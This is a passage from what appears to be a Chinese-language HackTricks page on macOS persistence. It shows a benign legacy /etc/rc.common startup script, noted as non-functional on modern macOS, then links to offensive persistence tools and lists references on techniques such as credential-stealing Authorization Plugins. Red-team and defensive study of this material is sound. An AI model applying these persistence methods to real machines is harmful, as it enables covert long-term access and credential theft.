显然，运行此 script 并不常见，我甚至无法在我的 macOS 中找到它，因此如果你想了解更多信息，请查看该 writeup。<sup>[36]</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **这在现代 MacOS 版本中不起作用**

也可以在此处放置**将在启动时执行的 commands。**例如，一个常规的 rc.common script：
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## 持久化技术和工具

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## 参考资料

- [1] [2025：Infostealer 之年](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [超越那些老式的 LaunchAgents - 1 - shell 启动文件](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [超越那些老式的 LaunchAgents - 18 - X11 和 XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [超越那些老式的 LaunchAgents - 21 - 重新打开的应用程序](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [超越那些老式的 LaunchAgents - 20 - Terminal 偏好设置](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [超越那些老式的 LaunchAgents - 13 - Audio Plugin](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Audio Unit Plug-ins（SpecterOps）](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [超越那些老式的 LaunchAgents - 12 - QuickLook Plugin](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [超越那些老式的 LaunchAgents - 22 - LoginHook 和 LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [超越那些老式的 LaunchAgents - 4 - cron 任务](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [超越那些老式的 LaunchAgents - 2 - iTerm2 启动](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [超越那些老式的 LaunchAgents - 7 - xbar Plugin](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [超越那些老式的 LaunchAgents - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [超越那些老式的 LaunchAgents - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [超越那些老式的 LaunchAgents - 3 - Login Items](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [超越那些老式的 LaunchAgents - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [超越那些老式的 LaunchAgents - 24 - Folder Actions](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [macOS 上用于持久化的 Folder Actions（SpecterOps）](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [超越那些老式的 LaunchAgents - 27 - Dock 快捷方式](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [超越那些老式的 LaunchAgents - 17 - Color Picker](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [超越那些老式的 LaunchAgents - 26 - Finder Sync Plugin](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] [分析“Mac File Opener”持久化机制（Objective-See）](https://objective-see.org/blog/blog_0x11.html)
- [23] [超越那些老式的 LaunchAgents - 16 - Screen Saver](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [保存你的访问权限：用于 macOS 持久化的 Screen Saver（SpecterOps）](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [超越那些老式的 LaunchAgents - 11 - Spotlight Importer](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [超越那些老式的 LaunchAgents - 9 - Preference Pane](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [超越那些老式的 LaunchAgents - 19 - Periodic Script](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [超越那些老式的 LaunchAgents - 5 - Pluggable Authentication Module（PAM）](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [超越那些老式的 LaunchAgents - 28 - Authorization Plugin](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [使用 Authorization Plugin 进行持久化凭据窃取（SpecterOps）](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [超越那些老式的 LaunchAgents - 30 - man 配置文件 - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [超越那些老式的 LaunchAgents - 25 - Apache2 模块](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [超越那些老式的 LaunchAgents - 31 - BSM 审计框架](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [超越那些老式的 LaunchAgents - 23 - emond，事件监控守护进程](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [超越那些老式的 LaunchAgents - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [超越那些老式的 LaunchAgents - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)

{{#include ../banners/hacktricks-training.md}}
